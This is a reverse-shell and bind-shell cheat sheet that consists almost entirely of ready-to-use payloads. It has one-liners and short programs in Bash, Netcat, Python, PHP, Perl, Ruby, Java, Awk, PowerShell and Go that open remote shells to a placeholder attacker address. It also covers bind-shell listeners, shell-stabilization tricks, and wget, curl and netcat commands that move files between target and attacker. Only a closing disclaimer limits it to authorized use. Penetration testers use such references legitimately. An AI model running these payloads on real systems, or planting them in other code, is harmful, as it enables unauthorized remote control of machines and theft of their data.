# Reverse Shell & Bind Shell Cheat Sheet

This cheat sheet covers both reverse shells and bind shells, providing common commands and code snippets for various languages and tools.

---

## Reverse Shells

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port, and the target machine initiates the connection to the attacking machine. This is useful in scenarios where direct inbound connections to the target are blocked by firewalls or NAT.

### Listener (Attacker Machine)

Always set up a listener on your attacking machine first for reverse shells.

#### Netcat (Traditional)
```bash
nc -lvnp <PORT>
```
* `-l`: Listen mode
* `-v`: Verbose
* `-n`: Numeric-only IP addresses (no DNS lookups)
* `-p`: Specify port

#### Netcat (OpenBSD/Modern)
```bash
nc -lnvp <PORT>
```

#### Ncat (Nmap's Netcat)
```bash
ncat -lvnp <PORT>
```

#### Socat
```bash
socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```
* Provides a more stable and interactive shell.

#### Python Simple HTTP Server (for file transfer)
```bash
python3 -m http.server <PORT>
```

### Reverse Shells (Target Machine)

Execute these commands on the target machine to connect back to your listener. Replace `<ATTACKER_IP>` and `<PORT>` with your attacking machine's IP address and listener port.

#### Bash

##### TCP Dev (Common)
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

##### Exec
```bash
exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>
cat <&5 | while read line; do $line 2>&5 >&5; done
```

##### Simpler (less stable)
```bash
/bin/bash -i > /dev/tcp/<ATTACKER_IP>/<PORT> 0<&1 2>&1
```

#### Netcat

##### Traditional Netcat (often not present or limited)
```bash
nc <ATTACKER_IP> <PORT> -e /bin/sh
```
* `-e`: Execute program after connect (often disabled in compiled versions)

##### OpenBSD Netcat (more common on modern systems)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
```

#### Python

##### Python 2
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

##### Python 3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```

#### PHP

```php
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Perl

```perl
perl -MIO -e '$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<ATTACKER_IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r+"){|io|c.print io.read}end'
```

#### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"])
p.waitFor()
```

#### Awk (Gawk)

```bash
awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER_IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline cmd; if ((cmd = cmd) ~ /^exit$/) break; system(cmd); } while(cmd != ""); close(s); }}' /dev/null
```

#### PowerShell

##### TCP Client (Basic)
```powershell
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$bytes2 = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($bytes2,0,$bytes2.Length);$stream.Flush()};$client.Close()
```

##### TCP Client (with more stability - often requires admin or specific execution policy)
```powershell
$socket = New-Object System.Net.Sockets.TcpClient('<ATTACKER_IP>', <PORT>);
$stream = $socket.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$writer.AutoFlush = $true;

$proc = New-Object System.Diagnostics.Process;
$proc.StartInfo.FileName = 'cmd.exe';
$proc.StartInfo.UseShellExecute = $false;
$proc.StartInfo.RedirectStandardInput = $true;
$proc.StartInfo.RedirectStandardOutput = $true;
$proc.StartInfo.RedirectStandardError = $true;
$proc.Start();

$input = $proc.StandardInput;
$output = $proc.StandardOutput;
$error = $proc.StandardError;

$buffer = New-Object byte[] 1024;

$output.BaseStream.BeginRead($buffer, 0, $buffer.Length, [AsyncCallback]{
    param($ar)
    $bytesRead = $output.BaseStream.EndRead($ar);
    $writer.Write((New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead));
    $output.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
}, $null);

$error.BaseStream.BeginRead($buffer, 0, $buffer.Length, [AsyncCallback]{
    param($ar)
    $bytesRead = $error.BaseStream.EndRead($ar);
    $writer.Write((New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead));
    $error.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
}, $null);

while ($socket.Connected) {
    $line = $reader.ReadLine();
    $input.WriteLine($line);
}

$socket.Close();
```

#### Golang

##### Simple Go Reverse Shell (compile on attacker, transfer to target)

**1. Create `shell.go` on your attacker machine:**
```go
package main

import (
	"net"
	"os/exec"
)

func main() {
	conn, _ := net.Dial("tcp", "<ATTACKER_IP>:<PORT>")
	cmd := exec.Command("/bin/sh") // For Windows, use "cmd.exe"
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
```

**2. Compile for the target architecture (e.g., Linux x64):**
```bash
GOOS=linux GOARCH=amd64 go build -o shell shell.go
```
* `GOOS`: Target Operating System (e.g., `linux`, `windows`, `darwin`)
* `GOARCH`: Target Architecture (e.g., `amd64`, `386`, `arm`)

**3. Transfer `shell` binary to target and execute:**
```bash
./shell
```
(For Windows, it would be `shell.exe`)

---

## Bind Shells

A bind shell opens a listening port on the target machine, and the attacking machine connects to it. This is useful when the target machine is directly accessible (e.g., no firewall blocking inbound connections to the chosen port).

### Bind Shells (Target Machine)

Execute these commands on the target machine to open a listening port. Replace `<PORT>` with the desired port on the target.

#### Netcat

```bash
nc -lvnp <PORT> -e /bin/sh
```
* `-e`: Execute program after connect (often disabled in compiled versions). For more stable shells, use `mkfifo` method below.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp <PORT> >/tmp/f
```

#### Bash

```bash
mkfifo /tmp/backpipe
/bin/bash < /tmp/backpipe | nc -lvnp <PORT> > /tmp/backpipe
```

#### Python

##### Python 2
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",<PORT>));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

##### Python 3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",<PORT>));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```

#### PHP

```php
php -r '$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_bind($sock, "0.0.0.0", <PORT>);socket_listen($sock, 1);$client = socket_accept($sock);socket_write($client, "Connected!\n");$pid = pcntl_fork();if ($pid == -1) { die("could not fork"); } else if ($pid) { socket_close($client);socket_close($sock);} else { socket_close($sock);socket_dup($client, 0);socket_dup($client, 1);socket_dup($client, 2);passthru("/bin/sh -i");}'
```

#### Perl

```perl
perl -MIO::Socket::INET -e '$sock = new IO::Socket::INET (LocalHost => "0.0.0.0", LocalPort => "<PORT>", Listen => 1, ReuseAddr => 1); while ($conn = $sock->accept()) { $conn->autoflush(1); open(STDIN, "<&", $conn); open(STDOUT, ">&", $conn); open(STDERR, ">&", $conn); system("/bin/sh -i"); close $conn; }'
```

#### PowerShell

```powershell
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, <PORT>);
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
$reader = New-Object System.IO.StreamReader($stream);
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;

$process = New-Object System.Diagnostics.Process;
$process.StartInfo.FileName = "cmd.exe"; # Or "powershell.exe"
$process.StartInfo.RedirectStandardInput = $true;
$process.StartInfo.RedirectStandardOutput = $true;
$process.StartInfo.RedirectStandardError = true;
$process.StartInfo.UseShellExecute = $false;
$process.Start();

$input = $process.StandardInput;
$output = $process.StandardOutput;
$error = $process.StandardError;

$buffer = New-Object byte[] 1024;

$output.BaseStream.BeginRead($buffer, 0, $buffer.Length, [AsyncCallback]{
    param($ar)
    $bytesRead = $output.BaseStream.EndRead($ar);
    if ($bytesRead -gt 0) {
        $writer.Write((New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead));
        $output.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
    }
}, $null);

$error.BaseStream.BeginRead($buffer, 0, $buffer.Length, [AsyncCallback]{
    param($ar)
    $bytesRead = $error.BaseStream.EndRead($ar);
    if ($bytesRead -gt 0) {
        $writer.Write((New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead));
        $error.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
    }
}, $null);

while ($client.Connected) {
    $line = $reader.ReadLine();
    if ($line -eq "exit") { break; }
    $input.WriteLine($line);
}

$client.Close();
$listener.Stop();
```

#### Golang

##### Simple Go Bind Shell (compile on attacker, transfer to target)

**1. Create `bindshell.go` on your attacker machine:**
```go
package main

import (
	"net"
	"os/exec"
)

func main() {
	listener, _ := net.Listen("tcp", "0.0.0.0:<PORT>")
	conn, _ := listener.Accept()
	cmd := exec.Command("/bin/sh") // For Windows, use "cmd.exe"
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
```

**2. Compile for the target architecture (e.g., Linux x64):**
```bash
GOOS=linux GOARCH=amd64 go build -o bindshell bindshell.go
```
* `GOOS`: Target Operating System (e.g., `linux`, `windows`, `darwin`)
* `GOARCH`: Target Architecture (e.g., `amd64`, `386`, `arm`)

**3. Transfer `bindshell` binary to target and execute:**
```bash
./bindshell
```
(For Windows, it would be `bindshell.exe`)

### Attacker (Connecting to Bind Shell)

Once the bind shell is running on the target, connect to it from your attacking machine.

#### Netcat
```bash
nc <TARGET_IP> <PORT>
```

#### Socat
```bash
socat STDIO TCP:<TARGET_IP>:<PORT>
```

---

## Stabilizing Your Shell (After Initial Connection)

Once you have a basic shell, it's often unstable (no tab completion, no arrow keys). You can stabilize it.

1.  **On the target machine (after getting the initial shell):**
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    (If `python` isn't available, try `python3` or `script /dev/null -c bash`)

2.  **On your attacking machine (in the listener, after the `pty.spawn` command):**
    * Press `Ctrl+Z` to background the `netcat` process.
    * Type:
        ```bash
        stty raw -echo; fg
        ```
    * Press `Enter` twice.

3.  **On the target machine (still in the shell):**
    ```bash
    export TERM=xterm
    stty rows <YOUR_ROWS> columns <YOUR_COLS>
    ```
    (Replace `<YOUR_ROWS>` and `<YOUR_COLS>` with your terminal's dimensions, e.g., `stty rows 24 columns 80`). You can find these by typing `stty -a` on your attacking machine or by resizing your terminal.

---

## File Transfer

### Attacker (serving file)
```bash
# Using Python 3 HTTP server
python3 -m http.server 8000

# Using Netcat (less reliable for large files)
nc -lvnp <PORT> > received_file.txt
```

### Target (downloading file)
```bash
# Using Wget
wget http://<ATTACKER_IP>:<PORT>/file_to_download.txt

# Using Curl
curl http://<ATTACKER_IP>:<PORT>/file_to_download.txt -o downloaded_file.txt

# Using Python (if wget/curl not available)
python -c 'import requests; r = requests.get("http://<ATTACKER_IP>:<PORT>/file.txt"); open("file.txt", "wb").write(r.content)' # Python 2
python3 -c 'import requests; r = requests.get("http://<ATTACKER_IP>:<PORT>/file.txt"); open("file.txt", "wb").write(r.content)' # Python 3

# Using Netcat (sending file)
nc <ATTACKER_IP> <PORT> < file_to_send.txt
```

---

**Disclaimer:** This cheat sheet is for educational purposes only. Unauthorized access to computer systems is illegal and unethical. Always ensure you have explicit permission before attempting any of these techniques.